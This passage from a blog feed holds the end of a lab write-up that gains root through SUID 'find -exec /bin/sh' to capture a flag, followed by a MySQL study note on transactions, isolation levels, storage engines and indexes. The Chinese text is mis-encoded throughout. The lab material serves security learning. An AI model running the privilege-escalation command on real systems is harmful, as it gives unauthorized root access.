src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005135623191.png" alt="image-20221005135623191"></p><p>å¯ä»¥å‘ç°findå‘½ä»¤å¯ä»¥ç”¨æ¥ææƒ</p><p>å°è¯•ä½¿ç”¨findæ‰§è¡Œå‘½ä»¤</p><pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;whoami&quot;</span> \; <span class="hljs-comment"># æ³¨æ„è¿™é‡Œçš„-name åçš„å‚æ•°éœ€è¦æ˜¯å­˜åœ¨çš„æ–‡ä»¶</span></code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141313251.png" alt="image-20221005141313251"></p><p>è¿™é‡Œæ‰§è¡Œçš„ç»“æœå¯ä»¥çœ‹å‡ºfindæ˜¯å¯ä»¥ææƒçš„</p><h2 id="è·å–flag"><a href="#è·å–flag" class="headerlink" title="è·å–flag"></a>è·å–flag</h2><p>ç›´æ¥ä½¿ç”¨æ‰§è¡Œ <code>/bin/sh</code></p><pre><code class="hljs sh">find / -name flag4 -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20221005141539383.png" alt="image-20221005141539383"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¸—é€æµ‹è¯•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MySqlè¿›é˜¶å­¦ä¹ </title>
    <link href="/2022/09/27/mysql/"/>
    <url>/2022/09/27/mysql/</url>
    
    <content type="html"><![CDATA[<h1 id="Mysqlè¿›é˜¶å­¦ä¹ "><a href="#Mysqlè¿›é˜¶å­¦ä¹ " class="headerlink" title="Mysqlè¿›é˜¶å­¦ä¹ "></a>Mysqlè¿›é˜¶å­¦ä¹ </h1><h2 id="äº‹åŠ¡"><a href="#äº‹åŠ¡" class="headerlink" title="äº‹åŠ¡"></a>äº‹åŠ¡</h2><blockquote><p>äº‹åŠ¡ æ˜¯ä¸€ç»„æ“ä½œçš„é›†åˆï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¼šæŠŠæ‰€æœ‰çš„æ“ä½œä½œä¸ºä¸€ä¸ªæ•´ä½“ä¸€èµ·å‘ç³»</p><p>ç»Ÿæäº¤æˆ–æ’¤é”€æ“ä½œè¯·æ±‚ï¼Œå³è¿™äº›æ“ä½œè¦ä¹ˆåŒæ—¶æˆåŠŸï¼Œè¦ä¹ˆåŒæ—¶å¤±è´¥ã€‚</p><p>å°±æ¯”å¦‚: å¼ ä¸‰ç»™æå››è½¬è´¦1000å—é’±ï¼Œå¼ ä¸‰é“¶è¡Œè´¦æˆ·çš„é’±å‡å°‘1000ï¼Œè€Œæå››é“¶è¡Œè´¦æˆ·çš„é’±è¦å¢åŠ </p><p>1000ã€‚ è¿™ä¸€ç»„æ“ä½œå°±å¿…é¡»åœ¨ä¸€ä¸ªäº‹åŠ¡çš„èŒƒå›´å†…ï¼Œè¦ä¹ˆéƒ½æˆåŠŸï¼Œè¦ä¹ˆéƒ½å¤±è´¥ã€‚</p></blockquote><p>æ•°æ®çš„å‡†å¤‡</p><pre><code class="hljs mysql">drop table if exists account;create table account(    id    int primary key AUTO_INCREMENT comment &#39;ID&#39;,    name  varchar(10) comment &#39;å§“å&#39;,    money double(10, 2) comment &#39;ä½™é¢&#39;) comment &#39;è´¦æˆ·è¡¨&#39;;insert into account(name, money)VALUES (&#39;å¼ ä¸‰&#39;, 2000),       (&#39;æå››&#39;, 2000);</code></pre><p>æ­£å¸¸çš„æ“ä½œä¸‹è¡¨æ•°æ®çš„å˜åŒ–</p><pre><code class="hljs mysql">select * from account;select * from account where name &#x3D; &#39;å¼ ä¸‰&#39;;update account set money &#x3D; money - 1000 where id &#x3D; 1;update account set money &#x3D; money + 1000 where id &#x3D; 2;</code></pre><p>æ“ä½œå¼‚å¸¸æƒ…å†µä¸‹çš„æ•°æ®æƒ…å†µ</p><pre><code class="hljs mysql">update account set money &#x3D; money - 1000 where id &#x3D; 1;errorupdate account set money &#x3D; money + 1000 where id &#x3D; 2;</code></pre><p>åœ¨æ­¤æƒ…å†µä¸‹ï¼Œç¬¬äºŒå¥sqlæ— æ³•æ‰§è¡Œåˆ°</p><p>è¿™æ ·å°±ä¼šå¯¼è‡´å¼ ä¸‰ç”¨æˆ·è´¦æˆ·çš„é’±å°‘äº†ï¼Œä½†æ˜¯æå››è´¦å·å¹¶æ²¡æœ‰æ”¶åˆ°é’±ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°é—®é¢˜ã€‚</p><h3 id="æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡"><a href="#æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡" class="headerlink" title="æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡"></a>æ‰‹åŠ¨æ§åˆ¶äº‹åŠ¡</h3><p>1).æŸ¥çœ‹/è®¾ç½®äº‹åŠ¡æäº¤æ–¹å¼</p><pre><code class="hljs mysql">select @@autocommit;set @@autocommit &#x3D; 0;</code></pre><p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922154213267.png" alt="image-20220922154213267"></p><p>2).æäº¤äº‹åŠ¡</p><pre><code class="hljs mysql">commit;</code></pre><p>3).äº‹åŠ¡å›æ»š</p><pre><code class="hljs abnf">rollback<span class="hljs-comment">;</span></code></pre><blockquote><p>ä¸Šé¢çš„è¿‡ç¨‹æ˜¯å°†äº‹åŠ¡çš„æäº¤è®¾ç½®ä¸ºæ‰‹åŠ¨æäº¤ï¼Œæ­¤æ—¶æˆ‘ä»¬æ‰§è¡Œçš„DMLè¯­å¥éƒ½ä¸ä¼šæäº¤, éœ€è¦æ‰‹åŠ¨çš„æ‰§è¡Œcommitè¿›è¡Œæäº¤ã€‚</p></blockquote><h3 id="è‡ªåŠ¨æ§åˆ¶äº‹åŠ¡"><a href="#è‡ªåŠ¨æ§åˆ¶äº‹åŠ¡" class="headerlink" title="è‡ªåŠ¨æ§åˆ¶äº‹åŠ¡"></a>è‡ªåŠ¨æ§åˆ¶äº‹åŠ¡</h3><p>1).å¼€å¯äº‹åŠ¡</p><pre><code class="hljs mysql">statr&#x2F;begin tranaction</code></pre><p>2).æäº¤äº‹åŠ¡</p><pre><code class="hljs mysql">commitï¼›</code></pre><p>3).äº‹åŠ¡å›æ»š</p><pre><code class="hljs mysql">rollbock;</code></pre><p>è½¬è´¦æ¡ˆä¾‹å®ç°</p><pre><code class="hljs mysql">start transaction;-- ä»å¼ ä¸‰è´¦æˆ·ä¸­è½¬å‡ºé’±update account set money &#x3D; money - 1000 where id &#x3D; 1;-- å‘æå››è´¦å·ä¸­è½¬å…¥é’±update account set money &#x3D; money + 1000 where id &#x3D; 2;-- æ‰§è¡Œå®Œæ¯•ï¼Œæäº¤äº‹åŠ¡commit;</code></pre><h3 id="äº‹åŠ¡å››å¤§ç‰¹æ€§"><a href="#äº‹åŠ¡å››å¤§ç‰¹æ€§" class="headerlink" title="äº‹åŠ¡å››å¤§ç‰¹æ€§"></a>äº‹åŠ¡å››å¤§ç‰¹æ€§</h3><ul><li><p>åŸå­æ€§ï¼ˆAtomicityï¼‰ï¼šäº‹åŠ¡æ˜¯ä¸å¯åˆ†å‰²çš„æœ€å°æ“ä½œå•å…ƒï¼Œè¦ä¹ˆå…¨éƒ¨æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥ã€‚</p></li><li><p>ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ï¼šäº‹åŠ¡å®Œæˆæ—¶ï¼Œå¿…é¡»ä½¿æ‰€æœ‰çš„æ•°æ®éƒ½ä¿æŒä¸€è‡´çŠ¶æ€ã€‚</p></li><li><p>éš”ç¦»æ€§ï¼ˆIsolationï¼‰ï¼šæ•°æ®åº“ç³»ç»Ÿæä¾›çš„éš”ç¦»æœºåˆ¶ï¼Œä¿è¯äº‹åŠ¡åœ¨ä¸å—å¤–éƒ¨å¹¶å‘æ“ä½œå½±å“çš„ç‹¬ç«‹</p></li></ul><p>ç¯å¢ƒä¸‹è¿è¡Œã€‚</p><ul><li>æŒä¹…æ€§ï¼ˆDurabilityï¼‰ï¼šäº‹åŠ¡ä¸€æ—¦æäº¤æˆ–å›æ»šï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…çš„ã€‚</li></ul><p>ä¸Šè¿°å°±æ˜¯äº‹åŠ¡çš„å››å¤§ç‰¹æ€§ï¼Œç®€ç§°ACIDã€‚ </p><h3 id="å¹¶å‘äº‹åŠ¡äº§ç”Ÿçš„é—®é¢˜"><a href="#å¹¶å‘äº‹åŠ¡äº§ç”Ÿçš„é—®é¢˜" class="headerlink" title="å¹¶å‘äº‹åŠ¡äº§ç”Ÿçš„é—®é¢˜"></a>å¹¶å‘äº‹åŠ¡äº§ç”Ÿçš„é—®é¢˜</h3><p>1). èµƒè¯»ï¼šä¸€ä¸ªäº‹åŠ¡è¯»åˆ°å¦å¤–ä¸€ä¸ªäº‹åŠ¡è¿˜æ²¡æœ‰æäº¤çš„æ•°æ®</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155417574.png" alt="image-20220922155417574"></p><p>2). ä¸å¯é‡å¤è¯»ï¼šä¸€ä¸ªäº‹åŠ¡å…ˆåè¯»å–åŒä¸€æ¡è®°å½•ï¼Œä½†ä¸¤æ¬¡è¯»å–çš„æ•°æ®ä¸åŒï¼Œç§°ä¹‹ä¸ºä¸å¯é‡å¤è¯»ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155423618.png" alt="image-20220922155423618"></p><p>3). å¹»è¯»ï¼šä¸€ä¸ªäº‹åŠ¡æŒ‰ç…§æ¡ä»¶æŸ¥è¯¢æ•°æ®æ—¶ï¼Œæ²¡æœ‰å¯¹åº”çš„æ•°æ®è¡Œï¼Œä½†æ˜¯åœ¨æ’å…¥æ•°æ®æ—¶ï¼Œåˆå‘ç°è¿™è¡Œæ•°æ®</p><p>å·²ç»å­˜åœ¨ï¼Œå¥½åƒå‡ºç°äº† â€œå¹»å½±â€ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922155433815.png" alt="image-20220922155433815"></p><h3 id="äº‹åŠ¡çš„éš”ç¦»çº§åˆ«"><a href="#äº‹åŠ¡çš„éš”ç¦»çº§åˆ«" class="headerlink" title="äº‹åŠ¡çš„éš”ç¦»çº§åˆ«"></a>äº‹åŠ¡çš„éš”ç¦»çº§åˆ«</h3><p>ä¸ºäº†è§£å†³äº‹åŠ¡å¹¶å‘äº§ç”Ÿçš„é—®é¢˜ï¼Œåœ¨æ•°æ®åº“ä¸­å¼•å…¥äº†äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p><table><thead><tr><th>éš”ç¦»çº§åˆ«</th><th>è„è¯»</th><th>ä¸å¯é‡å¤åº¦</th><th>å¹»è¯»</th></tr></thead><tbody><tr><td>Read uncommited(è¯»æœªæäº¤)</td><td>âˆš</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Read commited(è¯»å·²æäº¤)</td><td>Ã—</td><td>âˆš</td><td>âˆš</td></tr><tr><td>Repeatable Read(é»˜è®¤)</td><td>Ã—</td><td>Ã—</td><td>âˆš</td></tr><tr><td>Serializable(ä¸²è¡ŒåŒ–)</td><td>Ã—</td><td>Ã—</td><td>Ã—</td></tr></tbody></table><p>1). æŸ¥çœ‹äº‹åŠ¡çš„éš”ç¦»çº§åˆ«</p><pre><code class="hljs mysql">SELECT @@TRANSACTION_ISOLATION;</code></pre><p>Mysqlé»˜è®¤ä½¿ç”¨çš„æ˜¯<code>Repeatable Read</code></p><p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922160058646.png" alt="image-20220922160058646"></p><p>2).è®¾ç½®äº‹åŠ¡éš”ç¦»çº§åˆ«</p><pre><code class="hljs mysql">SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123; READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;-- sessionæ˜¯è®¾ç½®å½“å‰ä¼šè¯å³å½“å‰è¿æ¥çš„ç»ˆç«¯çš„éš”ç¦»çº§åˆ«-- GLOBALæ˜¯è®¾ç½®æ‰€æœ‰ä¼šè¯çš„éš”ç¦»çº§åˆ«</code></pre><blockquote><p>æ³¨æ„ï¼šäº‹åŠ¡çš„éš”ç¦»çº§åˆ«è¶Šé«˜å…¶æ€§èƒ½è¶Šä½</p></blockquote><h2 id="å­˜å‚¨å¼•æ“"><a href="#å­˜å‚¨å¼•æ“" class="headerlink" title="å­˜å‚¨å¼•æ“"></a>å­˜å‚¨å¼•æ“</h2><p>æŸ¥çœ‹å½“å‰æ•°æ®åº“æ”¯æŒçš„å­˜å‚¨å¼•æ“</p><pre><code class="hljs mysql">show engines</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922150430705.png" alt="image-20220922150430705"></p><p>å½“åˆ›å»ºè¡¨æ—¶é»˜è®¤ä½¿ç”¨InnoDBå­˜å‚¨å¼•æ“</p><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> tb_user;</code></pre><p><img src="/2022/09/27/mysql/OneDrive%20-%20cumt.edu.cn/LAB/note/mysql.assets/image-20220922150801513.png" alt="image-20220922150801513"></p><p>åˆ›å»ºæ•°æ®è¡¨æ—¶æŒ‡å®šæ•°æ®å¼•æ“ï¼Œæ·»åŠ å‚æ•°<code>engine=å­˜å‚¨å¼•æ“å</code></p><pre><code class="hljs mysql">create table my_myisam(    id   int,    name varchar(10)) engine &#x3D; MyISAM;create table my_myisam(    id   int,    name varchar(10)) engine &#x3D; Memory;</code></pre><h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a><strong>InnoDB</strong></h3><p>1). ä»‹ç»</p><p>InnoDBæ˜¯ä¸€ç§å…¼é¡¾é«˜å¯é æ€§å’Œé«˜æ€§èƒ½çš„é€šç”¨å­˜å‚¨å¼•æ“ï¼Œåœ¨ MySQL 5.5 ä¹‹åï¼ŒInnoDBæ˜¯é»˜è®¤çš„MySQL å­˜å‚¨å¼•æ“ã€‚</p><p>2). ç‰¹ç‚¹</p><ul><li>DMLæ“ä½œéµå¾ªACIDæ¨¡å‹ï¼Œæ”¯æŒäº‹åŠ¡ï¼›</li><li>è¡Œçº§é”ï¼Œæé«˜å¹¶å‘è®¿é—®æ€§èƒ½ï¼›</li><li>æ”¯æŒå¤–é”®FOREIGN KEYçº¦æŸï¼Œä¿è¯æ•°æ®çš„å®Œæ•´æ€§å’Œæ­£ç¡®æ€§ï¼›</li></ul><p>3).é€»è¾‘å­˜å‚¨ç»“æ„</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922151214606.png" alt="image-20220922151214606"></p><h3 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a><strong>MyISAM</strong></h3><p>1). ä»‹ç»</p><p>MyISAMæ˜¯MySQLæ—©æœŸçš„é»˜è®¤å­˜å‚¨å¼•æ“ã€‚</p><p>2). ç‰¹ç‚¹</p><ul><li><p>ä¸æ”¯æŒäº‹åŠ¡ï¼Œä¸æ”¯æŒå¤–é”®</p></li><li><p>æ”¯æŒè¡¨é”ï¼Œä¸æ”¯æŒè¡Œé”</p></li><li><p>è®¿é—®é€Ÿåº¦å¿«</p></li></ul><h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a><strong>Memory</strong></h3><p>1). ä»‹ç»</p><p>Memoryå¼•æ“çš„è¡¨æ•°æ®æ—¶å­˜å‚¨åœ¨å†…å­˜ä¸­çš„ï¼Œç”±äºå—åˆ°ç¡¬ä»¶é—®é¢˜ã€æˆ–æ–­ç”µé—®é¢˜çš„å½±å“ï¼Œåªèƒ½å°†è¿™äº›è¡¨ä½œä¸ºä¸´æ—¶è¡¨æˆ–ç¼“å­˜ä½¿ç”¨ã€‚</p><p>2). ç‰¹ç‚¹</p><ul><li><p>å†…å­˜å­˜æ”¾</p></li><li><p>hashç´¢å¼•ï¼ˆé»˜è®¤ï¼‰</p></li></ul><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922151341240.png" alt="image-20220922151341240"></p><blockquote><p>é¢è¯•é¢˜:</p><p>InnoDBå¼•æ“ä¸MyISAMå¼•æ“çš„åŒºåˆ« ? </p><p>â‘ . InnoDBå¼•æ“, æ”¯æŒäº‹åŠ¡, è€ŒMyISAMä¸æ”¯æŒã€‚</p><p>â‘¡. InnoDBå¼•æ“, æ”¯æŒè¡Œé”å’Œè¡¨é”, è€ŒMyISAMä»…æ”¯æŒè¡¨é”, ä¸æ”¯æŒè¡Œé”ã€‚</p><p>â‘¢. InnoDBå¼•æ“, æ”¯æŒå¤–é”®, è€ŒMyISAMæ˜¯ä¸æ”¯æŒçš„ã€‚</p><p>ä¸»è¦æ˜¯ä¸Šè¿°ä¸‰ç‚¹åŒºåˆ«ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä»ç´¢å¼•ç»“æ„ã€å­˜å‚¨é™åˆ¶ç­‰æ–¹é¢ï¼Œæ›´åŠ æ·±å…¥çš„å›ç­”ï¼Œå…·ä½“å‚</p><p>è€ƒå¦‚ä¸‹å®˜æ–¹æ–‡æ¡£ï¼š</p><p><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html">https://dev.mysql.com/doc/refman/8.0/en/innodb-introduction.html</a></strong></p><p><strong><a href="https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html">https://dev.mysql.com/doc/refman/8.0/en/myisam-storage-engine.html</a></strong></p></blockquote><p><strong>å­˜å‚¨å¼•æ“çš„é€‰æ‹©</strong></p><p>åœ¨é€‰æ‹©å­˜å‚¨å¼•æ“æ—¶ï¼Œåº”è¯¥æ ¹æ®åº”ç”¨ç³»ç»Ÿçš„ç‰¹ç‚¹é€‰æ‹©åˆé€‚çš„å­˜å‚¨å¼•æ“ã€‚</p><ul><li>InnDB:æ˜¯mysqlçš„é»˜è®¤å­˜å‚¨å¼•æ“ï¼Œæ”¯æŒäº‹åŠ¡ã€å¤–é”®ã€‚å¦‚æœåº”ç”¨å¯¹äº‹åŠ¡çš„å®Œæ•´æ€§è¦æ±‚æ¯”è¾ƒé«˜ï¼Œåœ¨å¹¶å‘æ¡ä»¶ä¸‹è¦æ±‚æ•°æ®çš„ä¸€è‡´æ€§çš„æƒ…å†µä¸‹åº”è¯¥é€‰æ‹©æ­¤å­˜å‚¨å¼•æ“ã€‚</li><li>MyISAM: å¦‚æœåº”ç”¨æ˜¯ä»¥è¯»å–å’Œæ’å…¥æ“ä½œä¸ºä¸» ï¼Œåªæœ‰å°‘é‡çš„åˆ é™¤å’Œæ›´æ–°æ“ä½œï¼Œå¹¶ä¸”å¯¹äº‹åŠ¡çš„å®Œæ•´æ€§ï¼Œå¹¶å‘æ€§è¦æ±‚ä¸æ˜¯å¾ˆé«˜ï¼Œé‚£ä¹ˆé€‰æ‹©æ­¤å­˜å‚¨å¼•æ“åˆé€‚</li><li>Memory: å°†æ‰€æœ‰æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œ è®¿é—®é€Ÿåº¦å¿«ï¼Œé€šå¸¸ç”¨äºä¸´æ—¶è¡¨å’Œç¼“å­˜ã€‚ä½†æ˜¯ç”±äºå­˜æ”¾åœ¨å†…å­˜ä¸­å…¶å—åˆ°çš„é™åˆ¶ä¹Ÿå¾ˆå¤šï¼Œå¦‚è¡¨çš„å¤§å°é™åˆ¶ï¼Œæ— æ³•å¯¹è¿‡å¤§çš„è¡¨è¿›è¡Œç¼“å­˜ï¼Œè¿˜æœ‰å®‰å…¨æ€§é—®é¢˜ï¼Œå¦‚æ–­ç”µæ—¶æ•°æ®ä¸¢å¤±ã€‚</li></ul><h2 id="ç´¢å¼•"><a href="#ç´¢å¼•" class="headerlink" title="ç´¢å¼•"></a>ç´¢å¼•</h2><p><strong>ä»‹ç»</strong></p><blockquote><p>ç´¢å¼•ï¼ˆindexï¼‰æ˜¯å¸®åŠ©MySQLé«˜æ•ˆè·å–æ•°æ®çš„æ•°æ®ç»“æ„(æœ‰åº)ã€‚åœ¨æ•°æ®ä¹‹å¤–ï¼Œæ•°æ®åº“ç³»ç»Ÿè¿˜ç»´æŠ¤ç€æ»¡è¶³</p><p>ç‰¹å®šæŸ¥æ‰¾ç®—æ³•çš„æ•°æ®ç»“æ„ï¼Œè¿™äº›æ•°æ®ç»“æ„ä»¥æŸç§æ–¹å¼å¼•ç”¨ï¼ˆæŒ‡å‘ï¼‰æ•°æ®ï¼Œ è¿™æ ·å°±å¯ä»¥åœ¨è¿™äº›æ•°æ®ç»“æ„</p><p>ä¸Šå®ç°é«˜çº§æŸ¥æ‰¾ç®—æ³•ï¼Œè¿™ç§æ•°æ®ç»“æ„å°±æ˜¯ç´¢å¼•ã€‚</p></blockquote><h3 id="ç´¢å¼•ç»“æ„"><a href="#ç´¢å¼•ç»“æ„" class="headerlink" title="ç´¢å¼•ç»“æ„"></a><strong>ç´¢å¼•ç»“æ„</strong></h3><p>MySQLçš„ç´¢å¼•æ˜¯åœ¨å­˜å‚¨å¼•æ“å±‚å®ç°çš„ï¼Œä¸åŒçš„å­˜å‚¨å¼•æ“æœ‰ä¸åŒçš„ç´¢å¼•ç»“æ„ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ç§ï¼š</p><table><thead><tr><th>ç´¢å¼•ç»“æ„</th><th>æè¿°</th></tr></thead><tbody><tr><td>B+tree</td><td>æœ€å¸¸è§çš„ç´¢å¼•ç±»å‹ï¼Œå¤§éƒ¨åˆ†å¼•æ“éƒ½æ”¯æŒ B+ æ ‘ç´¢å¼•</td></tr><tr><td>Hashç´¢å¼•</td><td>åº•å±‚æ•°æ®ç»“æ„æ˜¯ç”¨å“ˆå¸Œè¡¨å®ç°çš„, åªæœ‰ç²¾ç¡®åŒ¹é…ç´¢å¼•åˆ—çš„æŸ¥è¯¢æ‰æœ‰æ•ˆ, ä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢</td></tr><tr><td>R-tree(ç©ºé—´ç´¢å¼•ï¼‰</td><td>ç©ºé—´ç´¢å¼•æ˜¯MyISAMå¼•æ“çš„ä¸€ä¸ªç‰¹æ®Šç´¢å¼•ç±»å‹ï¼Œä¸»è¦ç”¨äºåœ°ç†ç©ºé—´æ•°æ®ç±»å‹ï¼Œé€šå¸¸ä½¿ç”¨è¾ƒå°‘</td></tr><tr><td>Full-text(å…¨æ–‡ç´¢å¼•)</td><td>æ˜¯ä¸€ç§é€šè¿‡å»ºç«‹å€’æ’ç´¢å¼•,å¿«é€ŸåŒ¹é…æ–‡æ¡£çš„æ–¹å¼ã€‚ç±»ä¼¼äºLucene,Solr,ES</td></tr></tbody></table><p>å­˜å‚¨å¼•æ“å¯¹äºç´¢å¼•ç»“æ„çš„æ”¯æŒæƒ…å†µ</p><table><thead><tr><th>ç´¢å¼•</th><th>InnoDB</th><th>MyISAM</th><th>Memory</th></tr></thead><tbody><tr><td>B+tree</td><td>æ”¯æŒ</td><td>æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>Hashç´¢å¼•</td><td>ä¸æ”¯æŒ</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td></tr><tr><td>R-tree</td><td>ä¸æ”¯æŒ</td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr><tr><td>Full-text</td><td>5.6ç‰ˆæœ¬ä¹‹åæ”¯æŒ</td><td>æ”¯æŒ</td><td>ä¸æ”¯æŒ</td></tr></tbody></table><h3 id="B-tree"><a href="#B-tree" class="headerlink" title="B-tree"></a>B-tree</h3><blockquote><p>B-Treeï¼ŒBæ ‘æ˜¯ä¸€ç§å¤šå‰è·¯è¡¡æŸ¥æ‰¾æ ‘ï¼Œç›¸å¯¹äºäºŒå‰æ ‘ï¼ŒBæ ‘æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªåˆ†æ”¯ï¼Œå³å¤šå‰ã€‚ä»¥ä¸€é¢—æœ€å¤§åº¦æ•°ï¼ˆmax-degreeï¼‰ä¸º5(5é˜¶)çš„b-treeä¸ºä¾‹ï¼Œé‚£è¿™ä¸ªBæ ‘æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šå­˜å‚¨4ä¸ªkeyï¼Œ5ä¸ªæŒ‡é’ˆ</p></blockquote><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922171802873.png" alt="image-20220922171802873"></p><h3 id="B-Tree"><a href="#B-Tree" class="headerlink" title="B+Tree"></a>B+Tree</h3><blockquote><p>B+Treeæ˜¯B-Treeçš„å˜ç§ï¼Œæˆ‘ä»¬ä»¥ä¸€é¢—æœ€å¤§åº¦æ•°ï¼ˆmax-degreeï¼‰ä¸º4ï¼ˆ4é˜¶ï¼‰çš„b+treeä¸ºä¾‹ï¼Œå…¶ç»“æ„ç¤ºæ„å›¾ï¼š</p></blockquote><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220922171908681.png" alt="image-20220922171908681"></p><ul><li>ç»¿è‰²æ¡†æ¡†èµ·æ¥çš„éƒ¨åˆ†ï¼Œæ˜¯ç´¢å¼•éƒ¨åˆ†ï¼Œä»…ä»…èµ·åˆ°ç´¢å¼•æ•°æ®çš„ä½œç”¨ï¼Œä¸å­˜å‚¨æ•°æ®ã€‚</li><li>çº¢è‰²æ¡†æ¡†èµ·æ¥çš„éƒ¨åˆ†ï¼Œæ˜¯æ•°æ®å­˜å‚¨éƒ¨åˆ†ï¼Œåœ¨å…¶å¶å­èŠ‚ç‚¹ä¸­è¦å­˜å‚¨å…·ä½“çš„æ•°æ®ã€‚</li></ul><p>B+Tree ä¸ B-Treeç›¸æ¯”ï¼Œä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç‚¹åŒºåˆ«ï¼š</p><ul><li><p>æ‰€æœ‰çš„æ•°æ®éƒ½ä¼šå‡ºç°åœ¨å¶å­èŠ‚ç‚¹ã€‚</p></li><li><p>å¶å­èŠ‚ç‚¹å½¢æˆä¸€ä¸ªå•å‘é“¾è¡¨ã€‚</p></li><li><p>éå¶å­èŠ‚ç‚¹ä»…ä»…èµ·åˆ°ç´¢å¼•æ•°æ®ä½œç”¨ï¼Œå…·ä½“çš„æ•°æ®éƒ½æ˜¯åœ¨å¶å­èŠ‚ç‚¹å­˜æ”¾çš„ã€‚</p></li></ul><p>MySQLç´¢å¼•æ•°æ®ç»“æ„å¯¹ç»å…¸çš„B+Treeè¿›è¡Œäº†ä¼˜åŒ–ã€‚åœ¨åŸB+Treeçš„åŸºç¡€ä¸Šï¼Œå¢åŠ ä¸€ä¸ªæŒ‡å‘ç›¸é‚»å¶å­èŠ‚ç‚¹</p><p>çš„é“¾è¡¨æŒ‡é’ˆï¼Œå°±å½¢æˆäº†å¸¦æœ‰é¡ºåºæŒ‡é’ˆçš„B+Treeï¼Œæé«˜åŒºé—´è®¿é—®çš„æ€§èƒ½ï¼Œåˆ©äºæ’åºã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923112657769.png" alt="image-20220923112657769"></p><h3 id="Hashç´¢å¼•"><a href="#Hashç´¢å¼•" class="headerlink" title="Hashç´¢å¼•"></a>Hashç´¢å¼•</h3><p>å“ˆå¸Œç´¢å¼•å°±æ˜¯é‡‡ç”¨ä¸€å®šçš„hashç®—æ³•ï¼Œå°†é”®å€¼æ¢ç®—æˆæ–°çš„hashå€¼ï¼Œæ˜ å°„åˆ°å¯¹åº”çš„æ§½ä½ä¸Šï¼Œç„¶åå­˜å‚¨åœ¨hashè¡¨ä¸­ã€‚Javaä¸­çš„HashMapç»“æ„ç±»ä¼¼(æ ‘åŠ é“¾è¡¨çš„å®ç°æ–¹å¼)ã€‚å¦‚æœä¸¤ä¸ª(æˆ–å¤šä¸ª)é”®å€¼ï¼Œæ˜ å°„åˆ°ä¸€ä¸ªç›¸åŒçš„æ§½ä½ä¸Šï¼Œä»–ä»¬å°±äº§ç”Ÿäº†hashå†²çªï¼ˆä¹Ÿç§°ä¸ºhashç¢°æ’ï¼‰ï¼Œå¯ä»¥é€šè¿‡é“¾è¡¨æ¥è§£å†³ã€‚</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220923113007344.png" alt="image-20220923113007344"></p><p>ç‰¹ç‚¹</p><ul><li><p>Hashç´¢å¼•åªèƒ½ç”¨äºå¯¹ç­‰æ¯”è¾ƒ(=ï¼Œin)ï¼Œä¸æ”¯æŒèŒƒå›´æŸ¥è¯¢ï¼ˆbetweenï¼Œ&gt;ï¼Œ&lt; ï¼Œâ€¦ï¼‰</p></li><li><p>æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆæ’åºæ“ä½œ</p></li><li><p>æŸ¥è¯¢æ•ˆç‡é«˜ï¼Œé€šå¸¸(ä¸å­˜åœ¨hashå†²çªçš„æƒ…å†µ)åªéœ€è¦ä¸€æ¬¡æ£€ç´¢å°±å¯ä»¥äº†ï¼Œæ•ˆç‡é€šå¸¸è¦é«˜äºB+treeç´¢ 